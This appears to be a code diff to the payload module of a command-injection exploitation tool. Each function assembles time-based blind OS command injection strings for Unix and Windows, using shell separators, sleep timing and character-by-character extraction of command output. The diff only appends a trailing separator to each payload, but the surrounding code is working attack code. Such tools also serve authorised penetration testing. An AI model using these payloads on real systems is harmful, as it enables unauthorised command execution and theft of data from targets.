@@ -52,7 +52,8 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "if [ " + str(output_length) + " -ne $str1 ]" + separator +
                  "then sleep 0" + separator +
                  "else sleep " + str(timesec) + separator +
-                 "fi"
+                 "fi" + 
+                 separator
                  )
 
 
@@ -65,7 +66,8 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
                  "[ " + str(output_length) + " -eq $str1 ]" + separator +
-                 "sleep " + str(timesec)
+                 "sleep " + str(timesec) + 
+                 separator
                  )
       separator = _urllib.parse.unquote(separator)
 
@@ -74,7 +76,8 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       payload = (pipe +
                  "[ " + str(output_length) + " -ne $(echo " + TAG + settings.SINGLE_WHITESPACE +
                  pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator +
-                 "sleep " + str(timesec)
+                 "sleep " + str(timesec) + 
+                 separator
                  )
     else:
       pass
@@ -94,7 +97,6 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                 python_payload +
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-
                 )
 
     elif separator == "&&" :
@@ -105,7 +107,6 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                 python_payload +
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-
                 )
   else:
     if separator == ";" or separator == "%0a":
@@ -115,7 +116,8 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                  "if [ " + str(output_length) + " -ne ${str1} ]" + separator +
                  "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                  "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
-                 "fi "
+                 "fi" + 
+                 separator
                  )
 
     elif separator == "&&" :
@@ -126,7 +128,8 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                  # Find the length of the output, using readline().
                  "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator +
                  "[ " + str(output_length) + " -eq ${str1} ] " + separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + 
+                 separator
                  )
       
       separator = _urllib.parse.unquote(separator)
@@ -136,7 +139,8 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
       payload = (pipe +
                  # Find the length of the output, using readline().
                  "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\") ] " + separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + 
+                 separator
                  )
     else:
       pass
@@ -187,7 +191,8 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "if [ " + str(output_length) + " -ne $str1 ]" + separator +
                  "then sleep 0" + separator +
                  "else sleep " + str(timesec) + separator +
-                 "fi "
+                 "fi" + 
+                 separator
                 )
 
     elif separator == "&&" :
@@ -200,7 +205,8 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "str1=$(expr length $str)" + separator +
                  #"str1=${%23str}  " + separator +
                  "[ " + str(output_length) + " -eq $str1 ]" + separator +
-                 "sleep " + str(timesec)
+                 "sleep " + str(timesec) + 
+                 separator
                  )
       
       separator = _urllib.parse.unquote(separator)
@@ -210,7 +216,8 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
       payload = (pipe +
                  "[ " +str(output_length)+ " -ne $(echo -n \"$(" + cmd + ")\" " +
                  pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +
-                 "sleep " + str(timesec)
+                 "sleep " + str(timesec) + 
+                 separator
                  )
     else:
       pass
@@ -229,8 +236,8 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                 cmd +
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-
                 )
+      
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
@@ -239,7 +246,6 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                 cmd +
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-
                 )
   else:
     if separator == ";" or separator == "%0a":
@@ -249,7 +255,8 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                  "if [ " + str(output_length) + " -ne ${str1} ]" + separator +
                  "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                  "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
-                 "fi "
+                 "fi " + 
+                 separator
                  )
 
     elif separator == "&&" :
@@ -260,7 +267,8 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                  # Find the length of the output, using readline().
                  "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator +
                  "[ " + str(output_length) + " -eq ${str1} ] " + separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") " + 
+                 separator
                  )
       
       separator = _urllib.parse.unquote(separator)
@@ -270,7 +278,8 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
       payload = (pipe +
                  # Find the length of the output, using readline().
                  "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\") ] " + separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + 
+                 separator
                  )
     else:
       pass
@@ -321,7 +330,8 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 "if [ " + str(ascii_char) + " -ne $str ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
-                "fi "
+                "fi " + 
+                separator
                 )
 
     elif separator == "&&" :
@@ -337,7 +347,8 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 "str=$(printf '%d' \"'$char'\")" + separator +
                 # Perform the time-based comparisons
                 "[ " + str(ascii_char) + " -eq ${str} ] " + separator +
-                "sleep " + str(timesec)
+                "sleep " + str(timesec) + 
+                separator
                 )
       
       separator = _urllib.parse.unquote(separator)
@@ -348,7 +359,8 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 "[ " + str(ascii_char) + " -ne $(" + cmd + pipe + "tr -d '\\n'" +
                 pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" +
                 pipe + "head -1" + pipe + "awk '{print$2}') ] " + separator +
-                "sleep " + str(timesec)
+                "sleep " + str(timesec) + 
+                separator
                 )
     else:
       pass
@@ -368,7 +380,6 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                 python_payload +
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-
                 )
 
     elif separator == "&&" :
@@ -379,7 +390,6 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                 python_payload +
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-
                 )
   else:
     if separator == ";" or separator == "%0a":
@@ -388,7 +398,8 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                  "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
                  "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                  "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
-                 "fi "
+                 "fi" +
+                 separator
                  )
 
     elif separator == "&&" :
@@ -398,7 +409,8 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator +
                  "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator +
                  "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" +
+                 separator
                  )
       
       separator = _urllib.parse.unquote(separator)
@@ -407,7 +419,8 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
       pipe = "|"
       payload = (pipe +
                  "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" +
+                 separator
                  )
 
     else:
@@ -455,7 +468,8 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  "if [ " + str(ascii_char) + " -ne $str ]" + separator +
                  "then sleep 0" + separator +
                  "else sleep " + str(timesec) + separator +
-                 "fi "
+                 "fi" + 
+                 separator
                  )
 
     elif separator == "&&" :
@@ -465,7 +479,8 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  "sleep 0 " + separator +
                  "str=\"$(" + cmd + ")\" " + separator +
                  "[ " + str(ascii_char) + " -eq $str ] " + separator +
-                 "sleep " + str(timesec)
+                 "sleep " + str(timesec) + 
+                 separator
                  )
 
       
@@ -475,7 +490,8 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
       pipe = "|"
       payload = (pipe +
                  "[ " + str(ascii_char) + " -ne \"$(" + cmd + ")\" ] " + separator +
-                 "sleep " + str(timesec)
+                 "sleep " + str(timesec) + 
+                 separator
                  )
     else:
       pass
@@ -512,7 +528,8 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                  "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
                  "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                  "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
-                 "fi "
+                 "fi" +
+                 separator
                  )
 
     elif separator == "&&" :
@@ -522,7 +539,8 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator +
                  "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator +
                  "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" +
+                 separator
                  )
       
       separator = _urllib.parse.unquote(separator)
@@ -531,7 +549,8 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
       pipe = "|"
       payload = (pipe +
                  "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\") ] " + separator +
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" +
+                 separator
                  )
 
     else:
